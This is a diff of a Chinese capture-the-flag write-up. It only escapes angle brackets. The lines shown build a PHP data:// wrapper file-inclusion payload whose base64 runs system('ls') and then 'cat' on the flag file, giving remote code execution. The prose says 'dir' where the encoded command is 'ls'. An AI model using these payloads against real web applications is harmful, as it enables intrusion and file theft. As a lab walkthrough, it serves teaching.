@@ -26,9 +26,9 @@ __0x01 解题__
 
 > 小介绍（data：//）：php5.2.0起，数据流封装器开始有效，主要用于数据流的读取。如果传入的数据是PHP代码，就会执行代码
 
-1. 引用<?php system("dir")?>，构造payload： ?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCJscyIpPz4=  （base64编码之前有过工具链接）
+1. 引用 \<?php system("dir")?>，构造payload： ?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCJscyIpPz4=  （base64编码之前有过工具链接）
 
-2. 发现文件“fl4gisisish3r3.php”，采用<?php system("cat fl4gisisish3r3.php")?>,构造
+2. 发现文件“fl4gisisish3r3.php”，采用 \<?php system("cat fl4gisisish3r3.php")?>,构造
 
 payload:data://text/plain/;base64,PD9waHAgc3lzdGVtKCJjYXQgZmw0Z2lzaXNpc2gzcjMucGhwIik/Pg==
 
